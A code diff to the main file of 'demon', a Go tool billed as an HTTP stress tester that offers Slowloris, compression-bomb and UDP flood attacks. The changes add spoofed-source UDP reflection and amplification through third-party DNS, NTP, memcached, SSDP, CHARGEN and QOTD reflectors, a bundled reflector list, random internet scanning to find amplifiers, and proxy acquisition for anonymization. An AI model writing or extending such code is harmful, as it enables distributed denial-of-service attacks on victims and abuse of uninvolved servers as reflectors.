@@ -7,7 +7,7 @@
 ***********************************************************
 
 BUILD COMMAND:
-go build -o demon main.go
+go build -o demon .
 go build .
 
 MONITORING RESOURCES:
@@ -21,6 +21,7 @@ import (
 	"context"
 	"flag"
 	"fmt"
+	"net"
 	"os"
 	"os/signal"
 	"path/filepath"
@@ -66,11 +67,11 @@ func main() {
 	printHeader()
 
 	flag.Usage = func() {
-		fmt.Printf("%s", StyleText("demon v"+__version__, ColorWhite) + "\n")
-		fmt.Printf("%s", StyleText("http stress testing tool", ColorCyan) + "\n\n")
-		fmt.Printf("%s", StyleText("Usage: "+filepath.Base(os.Args[0])+" [OPTIONS] <target_url>", ColorWhite) + "\n\n")
+		fmt.Printf("%s", StyleText("demon v"+__version__, ColorWhite)+"\n")
+		fmt.Printf("%s", StyleText("http stress testing tool", ColorCyan)+"\n\n")
+		fmt.Printf("%s", StyleText("Usage: "+filepath.Base(os.Args[0])+" [OPTIONS] <target_url>", ColorWhite)+"\n\n")
 
-		fmt.Printf("%s", StyleText("ATTACK TYPES:", ColorGreen) + "\n")
+		fmt.Printf("%s", StyleText("ATTACK TYPES:", ColorGreen)+"\n")
 		attackTypes := []string{
 			"0: Volume Attack (High-frequency requests)",
 			"1: Slowloris (Connection exhaustion)",
@@ -89,11 +90,11 @@ func main() {
 		}
 		fmt.Println()
 
-		fmt.Printf("%s", StyleText("OPTIONS:", ColorGreen) + "\n")
+		fmt.Printf("%s", StyleText("OPTIONS:", ColorGreen)+"\n")
 		flag.PrintDefaults()
 		fmt.Println()
 
-		fmt.Printf("%s", StyleText("EXAMPLES:", ColorYellow) + "\n")
+		fmt.Printf("%s", StyleText("EXAMPLES:", ColorYellow)+"\n")
 		fmt.Printf("  # Basic stress test\n")
 		fmt.Printf("  %s -concurrency 50 -rate 500 https://example.com\n\n", filepath.Base(os.Args[0]))
 		fmt.Printf("  # 5 minute timed attack\n")
@@ -145,9 +146,22 @@ func main() {
 	bombSizeMB := flag.Int("bomb-size-mb", demonConfig.BombSizeMB, "Compression bomb (type 7): decompressed body size in MB")
 	maxHeld := flag.Int("max-held-connections", demonConfig.MaxHeldConnections, "Cap on simultaneously held connections for hold attacks (types 1/6/8); protects the operator's own machine")
 	maxUDPFloods := flag.Int("max-udp-floods", demonConfig.MaxUDPFloods, "Cap on concurrent UDP flood invocations (type 10). OS-thread safety backstop; raising it only helps on a fat pipe you can't already saturate, and risks the thread-exhaustion crash")
+	udpPPS := flag.Int("udp-pps", demonConfig.UDPPacketsPerSec, "Direct UDP flood (type 10): aggregate packet-rate cap in packets/sec across all senders (0 = built-in 100k). Raise it to find the target's real pps ceiling instead of the tool's own; it's logged and flagged in the dashboard when binding")
+	flag.BoolVar(&demonConfig.UDPDirect, "udp-direct", demonConfig.UDPDirect, "Force the direct (non-spoofed) UDP flood against the target only. This is already the default type-10 mode; the flag pins it and overrides -udp-reflection")
+	flag.BoolVar(&demonConfig.UDPReflection, "udp-reflection", demonConfig.UDPReflection, "Select the reflection/amplification UDP attack mode (type 10): raw sockets, spoofed source IP, third-party amplifiers. Needs root/CAP_NET_RAW. Off by default — the default type-10 mode is the direct, non-spoofed flood against your own target")
+	useBuiltInReflectorsFlag := flag.Bool("use-built-in-reflectors", false, "Load the bundled reflector seed corpus from assets/bundled_reflector_corpus.txt for type-10. Leave this false to force explicit file/discovery inventories only")
+
+	// UDP measurement for own-endpoint load testing. A receiver agent you
+	// run ON the target, plus the sender-side poller that turns its counts into
+	// real landed pps/bps and packet loss. None of this touches the flood engine;
+	// it's pure measurement so the dashboard stops treating a local send as a
+	// verified target hit.
+	udpReceiver := flag.String("udp-receiver", "", "Run as a UDP RECEIVER agent on your own target host instead of attacking: listen on this addr (e.g. :9999) and count received traffic for loss measurement")
+	receiverControl := flag.String("receiver-control", ":9100", "Receiver mode (-udp-receiver): HTTP addr that serves cumulative received counters as JSON at /stats")
+	receiverStats := flag.String("receiver-stats", "", "Sender side: poll a receiver agent's stats endpoint (host:port or full URL) to display real landed pps/bps and packet loss")
 
 	// Bandwidth / congestion control
-	bandwidth := flag.String("bandwidth", demonConfig.Bandwidth, "Cap UDP egress to this rate (e.g. 40mbit, 5MB, 500kbit) so a flood doesn't saturate your OWN uplink; empty = uncapped")
+	bandwidth := flag.String("bandwidth", demonConfig.Bandwidth, "Cap UDP egress to this rate (e.g. 40mbit, 5MB, 500kbit) so a flood doesn't saturate your OWN uplink; empty = a conservative 2 MB/s default (raise it to use more of your pipe)")
 	adaptiveBW := flag.Bool("adaptive-bandwidth", demonConfig.AdaptiveBandwidth, "Auto-throttle the send rate when local uplink congestion is detected (AIMD safety net; on by default)")
 
 	// UDP reflection amplifier lists, each flag points to a text file of IPs
@@ -156,14 +170,17 @@ func main() {
 	// for that protocol vector. SSDP has no useful hardcoded fallback (the old list
 	// was all private/multicast IPs the router drops before they leave your network)
 	// so it only runs when you supply a list here or use -discover-amplifiers.
-	dnsAmplFile  := flag.String("dns-amplifiers",       "", "File of open DNS resolver IPs for type-10 amplification (one IP per line; replaces built-in list)")
-	ntpAmplFile  := flag.String("ntp-amplifiers",       "", "File of NTP server IPs with monlist enabled for type-10 amplification")
-	memAmplFile  := flag.String("memcached-amplifiers", "", "File of open memcached instance IPs (Shodan: port:11211 product:memcached)")
-	ssdpAmplFile := flag.String("ssdp-amplifiers",      "", "File of publicly-routable UPnP device IPs (Shodan: port:1900 upnp)")
-	discoverAmp  := flag.Bool("discover-amplifiers",    false, "Probe random IPs for live amplifiers before attacking; auto-populates all four vector lists")
-	discoverSec  := flag.Int("discover-timeout",        45,   "Seconds to spend on amplifier auto-discovery (see -discover-amplifiers)")
-	discoverN    := flag.Int("discover-count",          50,   "How many live amplifiers to find per protocol before stopping discovery")
-	discoverSave := flag.Bool("discover-save",          false, "Save discovered amplifiers to amplifiers_<protocol>.txt for reuse across runs")
+	dnsAmplFile := flag.String("dns-amplifiers", "", "File of open DNS resolver IPs for type-10 amplification (one IP per line; replaces built-in list)")
+	ntpAmplFile := flag.String("ntp-amplifiers", "", "File of NTP server IPs with monlist enabled for type-10 amplification")
+	memAmplFile := flag.String("memcached-amplifiers", "", "File of open memcached instance IPs (Shodan: port:11211 product:memcached)")
+	ssdpAmplFile := flag.String("ssdp-amplifiers", "", "File of publicly-routable UPnP device IPs (Shodan: port:1900 upnp)")
+	chargenAmplFile := flag.String("chargen-amplifiers", "", "File of public CHARGEN reflector IPs for type-10 amplification")
+	qotdAmplFile := flag.String("qotd-amplifiers", "", "File of public QOTD reflector IPs for type-10 amplification")
+	discoverAmp := flag.Bool("discover-amplifiers", false, "Probe random IPs for live amplifiers before attacking; auto-populates the six UDP reflector vectors")
+	discoverSec := flag.Int("discover-timeout", 45, "Seconds to spend on amplifier auto-discovery (see -discover-amplifiers)")
+	discoverN := flag.Int("discover-count", 50, "How many live amplifiers to find per protocol before stopping discovery")
+	discoverWorkers := flag.Int("discover-workers", 32, "How many discovery goroutines to run per protocol; keep this conservative on small hosts")
+	discoverSave := flag.Bool("discover-save", false, "Save discovered amplifiers to amplifiers_<protocol>.txt for reuse across runs")
 
 	// Proxy acquisition tuning
 	proxyTarget := flag.Int("proxy-target", demonConfig.ProxyTargetCount, "Stop acquiring proxies once this many good ones are verified")
@@ -182,6 +199,18 @@ func main() {
 		}
 		demonConfig = customConfig
 		logger.Info("Loaded custom configuration from: " + *configFile)
+	}
+
+	// Receiver-agent mode: run as a measurement endpoint on a host you control and
+	// exit. This is the measurement counterpart to the flood — it counts what actually
+	// lands on the endpoint. It never sends attack traffic, so it short-circuits
+	// the rest of main() (no target URL required).
+	if *udpReceiver != "" {
+		if err := runUDPReceiver(*udpReceiver, *receiverControl); err != nil {
+			fmt.Printf("%s\n", StyleText("Error: "+err.Error(), ColorRed))
+			os.Exit(1)
+		}
+		return
 	}
 
 	// Configure logging verbosity
@@ -206,7 +235,7 @@ func main() {
 			attackDuration, err = time.ParseDuration(*duration)
 			if err != nil {
 				logger.Error(fmt.Sprintf("Invalid duration format '%s'. Use formats like '30s', '5m', '1h'", *duration))
-				fmt.Printf("%s", StyleText("Error: Invalid duration format", ColorRed) + "\n")
+				fmt.Printf("%s", StyleText("Error: Invalid duration format", ColorRed)+"\n")
 				fmt.Printf("Valid examples: 30s, 5m, 1h, 2h30m\n")
 				fmt.Printf("Use '0' or 'infinite' for unlimited duration\n\n")
 				flag.Usage()
@@ -227,7 +256,7 @@ func main() {
 	// Validate command line arguments
 	args := flag.Args()
 	if len(args) != 1 {
-		fmt.Printf("%s", StyleText("Error: Target URL required", ColorRed) + "\n\n")
+		fmt.Printf("%s", StyleText("Error: Target URL required", ColorRed)+"\n\n")
 		flag.Usage()
 		os.Exit(1)
 	}
@@ -329,7 +358,7 @@ func main() {
 		}
 	} else if demonConfig.ProxyRotation {
 		logger.Info("Auto-acquiring proxy infrastructure for anonymization")
-		fmt.Printf("%s", StyleText("\nProxy acquisition", ColorCyan) + "\n")
+		fmt.Printf("%s", StyleText("\nProxy acquisition", ColorCyan)+"\n")
 		fmt.Printf("Gathering anonymous proxy infrastructure...\n")
 
 		scrapedProxyPool = NewProxyPool()
@@ -417,7 +446,7 @@ func main() {
 	// Professional performance diagnostics
 	if *concurrency > *rateLimit {
 		logger.Warning(fmt.Sprintf("Performance bottleneck detected: concurrency (%d) exceeds rate limit (%d)", *concurrency, *rateLimit))
-		fmt.Printf("%s", StyleText("[!] performance advisory", ColorYellow) + "\n")
+		fmt.Printf("%s", StyleText("[!] performance advisory", ColorYellow)+"\n")
 		fmt.Printf("Current configuration may create worker starvation:\n")
 		fmt.Printf("• Workers: %d\n", *concurrency)
 		fmt.Printf("• Rate Limit: %d req/sec\n", *rateLimit)
@@ -475,6 +504,9 @@ func main() {
 	if *bombSizeMB > 0 {
 		config.BombSizeBytes = *bombSizeMB * 1024 * 1024
 	}
+	// direct UDP flood packet-rate cap; <=0 keeps the built-in 100k default in
+	// directUDPFlood. surfaced/logged there so a tool cap isn't read as the target's.
+	config.UDPPacketsPerSec = *udpPPS
 	// the held-connection cap is a package var read by every worker; only override
 	// the built-in default when given a positive value (0 would skip ALL holds).
 	if *maxHeld > 0 {
@@ -499,6 +531,10 @@ func main() {
 	} else if bps > 0 {
 		setBandwidthLimit(bps)
 		logger.Info(fmt.Sprintf("UDP egress capped to %s (%d bytes/s)", *bandwidth, bps))
+	} else {
+		// never run UDP truly uncapped, that only self-congests. adaptive-bandwidth
+		// throttles this further when the uplink saturates.
+		setBandwidthLimit(defaultUDPEgressBytesPerSec)
 	}
 	// proxy acquisition knobs are package vars read during acquisition; override the
 	// built-in defaults only on a positive value (0 keeps the default).
@@ -513,8 +549,8 @@ func main() {
 	}
 
 	// load amplifier files, each overrides the built-in hardcoded list for its
-	// vector. a missing or unreadable file is a hard error so you don't silently
-	// fall back to a stale list and wonder why amplification isn't working.
+	// vector. a missing or unreadable file is a hard error so the reflection path
+	// stays explicit and auditable instead of silently drifting into stale defaults.
 	if *dnsAmplFile != "" {
 		ips, loadErr := loadAmplifiersFromFile(*dnsAmplFile)
 		if loadErr != nil {
@@ -551,6 +587,51 @@ func main() {
 		udpSSDPAmplifiers = ips
 		logger.Info(fmt.Sprintf("loaded %d SSDP amplifiers from %s", len(ips), *ssdpAmplFile))
 	}
+	if *chargenAmplFile != "" {
+		ips, loadErr := loadAmplifiersFromFile(*chargenAmplFile)
+		if loadErr != nil {
+			fmt.Printf("%s\n", StyleText("Error loading -chargen-amplifiers: "+loadErr.Error(), ColorRed))
+			os.Exit(1)
+		}
+		udpChargenAmplifiers = ips
+		logger.Info(fmt.Sprintf("loaded %d CHARGEN amplifiers from %s", len(ips), *chargenAmplFile))
+	}
+	if *qotdAmplFile != "" {
+		ips, loadErr := loadAmplifiersFromFile(*qotdAmplFile)
+		if loadErr != nil {
+			fmt.Printf("%s\n", StyleText("Error loading -qotd-amplifiers: "+loadErr.Error(), ColorRed))
+			os.Exit(1)
+		}
+		udpQOTDAmplifiers = ips
+		logger.Info(fmt.Sprintf("loaded %d QOTD amplifiers from %s", len(ips), *qotdAmplFile))
+	}
+
+	useBuiltInReflectors = *useBuiltInReflectorsFlag
+	if useBuiltInReflectors {
+		corpus, err := loadBundledReflectorCorpus("assets/bundled_reflector_corpus.txt")
+		if err != nil {
+			logger.Warning("could not load bundled reflector corpus: " + err.Error())
+		} else {
+			if len(udpDNSAmplifiers) == 0 {
+				udpDNSAmplifiers = append([]net.IP(nil), corpus["dns"]...)
+			}
+			if len(udpNTPAmplifiers) == 0 {
+				udpNTPAmplifiers = append([]net.IP(nil), corpus["ntp"]...)
+			}
+			if len(udpMemcachedAmplifiers) == 0 {
+				udpMemcachedAmplifiers = append([]net.IP(nil), corpus["memcached"]...)
+			}
+			if len(udpSSDPAmplifiers) == 0 {
+				udpSSDPAmplifiers = append([]net.IP(nil), corpus["ssdp"]...)
+			}
+			if len(udpChargenAmplifiers) == 0 {
+				udpChargenAmplifiers = append([]net.IP(nil), corpus["chargen"]...)
+			}
+			if len(udpQOTDAmplifiers) == 0 {
+				udpQOTDAmplifiers = append([]net.IP(nil), corpus["qotd"]...)
+			}
+		}
+	}
 
 	// auto-discovery: probe random internet IPs for live amplifiers and store the
 	// results in the package-level vars above. this runs before any workers start
@@ -570,11 +651,11 @@ func main() {
 		fmt.Printf("scanning for live amplifiers (timeout=%ds, target=%d per protocol)...\n",
 			*discoverSec, discoverCount)
 		if *discoverSave {
-			if saveErr := discoverAmplifiersToFile("amplifiers", 500, discoverCount, discoverDur); saveErr != nil {
+			if saveErr := discoverAmplifiersToFile("amplifiers", *discoverWorkers, discoverCount, discoverDur); saveErr != nil {
 				logger.Warning("could not save discovered amplifiers: " + saveErr.Error())
 			}
 		} else {
-			discoverAmplifiers(500, discoverCount, discoverDur)
+			discoverAmplifiers(*discoverWorkers, discoverCount, discoverDur)
 		}
 	}
 
@@ -594,6 +675,19 @@ func main() {
 		}(w)
 	}
 
+	// Mark a UDP-only run so (a) the health monitor uses the UDP-aware path instead
+	// of an HTTP HEAD that would false-"down" a UDP service, and (b) the dashboard
+	// shows the send / landed / loss split rather than treating a local write
+	// as a verified hit. Must be set BEFORE healthMonitor starts.
+	if len(hybridAttackTypes) == 1 && hybridAttackTypes[0] == UDP_FLOOD {
+		atomic.StoreUint64(&udpModeActive, 1)
+	}
+	// Per-second send-rate sampler (always useful in UDP mode); plus the receiver
+	// poller when -receiver-stats points at an agent running on your endpoint.
+	if atomic.LoadUint64(&udpModeActive) == 1 || *receiverStats != "" {
+		startUDPMeasurement(ctx, *receiverStats)
+	}
+
 	// Professional health monitoring
 	go healthMonitor(ctx, targetURL)
 	atomic.StoreUint64(&targetResponding, 1)
@@ -602,7 +696,13 @@ func main() {
 	// saturated, not the target down), auto-throttle the send rate and ramp back as
 	// it clears. on by default, overshooting our own uplink never helped anyway.
 	if *adaptiveBW {
-		go adaptiveCongestionControl(ctx, limiter, float64(*rateLimit), logger)
+		// throttle both the HTTP request limiter and the live UDP egress limiter on
+		// self-congestion; whichever the running attack uses gets backed off.
+		udpBase := 0.0
+		if bwLimiter != nil {
+			udpBase = float64(bwLimiter.Limit())
+		}
+		go adaptiveCongestionControl(ctx, limiter, float64(*rateLimit), bwLimiter, udpBase, logger)
 	}
 
 	// Professional graceful shutdown handler
@@ -612,7 +712,7 @@ func main() {
 	go func() {
 		<-stop
 		logger.Info("Graceful shutdown initiated by user signal")
-		fmt.Printf("%s", StyleText("\n[stop] shutting down", ColorYellow) + "\n")
+		fmt.Printf("%s", StyleText("\n[stop] shutting down", ColorYellow)+"\n")
 		fmt.Printf("cancelling all in-flight work...\n")
 		// cancel() propagates to every goroutine that holds ctx, no need to
 		// also close(jobs) here. closing a channel while the distributor may
@@ -700,7 +800,7 @@ func main() {
 			<-ctx.Done()
 			if ctx.Err() == context.DeadlineExceeded {
 				logger.Info(fmt.Sprintf("Attack duration of %v completed", attackDuration))
-				fmt.Printf("%s", StyleText("\n[ok] attack duration completed", ColorGreen) + "\n")
+				fmt.Printf("%s", StyleText("\n[ok] attack duration completed", ColorGreen)+"\n")
 				fmt.Printf("Configured duration of %v reached.\n", attackDuration)
 				fmt.Printf("Initiating graceful shutdown...\n")
 				close(timeoutReached)
@@ -744,7 +844,7 @@ func main() {
 			logger.Info("All workers completed after timeout")
 		case <-time.After(10 * time.Second):
 			logger.Warning("Force shutdown after 10 seconds grace period")
-			fmt.Printf("%s", StyleText("[!] force termination after grace period", ColorYellow) + "\n")
+			fmt.Printf("%s", StyleText("[!] force termination after grace period", ColorYellow)+"\n")
 		}
 	case <-time.After(func() time.Duration {
 		if attackDuration > 0 {
@@ -753,7 +853,7 @@ func main() {
 		return 365 * 24 * time.Hour // Effectively infinite for infinite attacks
 	}()):
 		logger.Warning("Emergency force shutdown triggered")
-		fmt.Printf("%s", StyleText("[!] emergency force termination", ColorRed) + "\n")
+		fmt.Printf("%s", StyleText("[!] emergency force termination", ColorRed)+"\n")
 	}
 
 	// Professional completion report. hand the terminal back: stop the dashboard
